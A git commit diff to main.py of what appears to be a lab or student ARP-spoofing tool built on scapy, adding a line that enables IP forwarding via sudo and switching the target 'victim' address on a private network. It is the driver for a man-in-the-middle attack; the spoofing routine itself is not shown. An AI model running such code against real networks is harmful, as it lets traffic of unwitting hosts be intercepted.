8ee97ca278cf1255cf4b41ab2d9108cc76f2d854
LeonGr <mail+github@leongr.nl>
2021-06-02 11:55:26 +0200

    Add enabling of packet forwarding to main.py (because I keep forgetting)

--- main.py
+++ main.py
@@ -1,18 +1,21 @@
 # import sys
 # import getopt
 import time
+import os
 
 from arp import spoof
 from scapy.all import get_if_hwaddr, getmacbyip
 
 if __name__ == "__main__":
+    print("Enabling ip forwarding")
+    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
     # iface = "enp0s3"
     iface = "enp7s0"
     mac_attacker = get_if_hwaddr(iface)
     # Leon's victim
     # ip_victim = "192.168.192.16"
     # ip_victim = "192.168.192.7"
-    ip_victim = "192.168.192.6"
+    ip_victim = "192.168.192.29"
     # Karolina's victim
     # ip_victim = "192.168.0.39"
     # mac_victim = get_mac(ip_victim, iface)
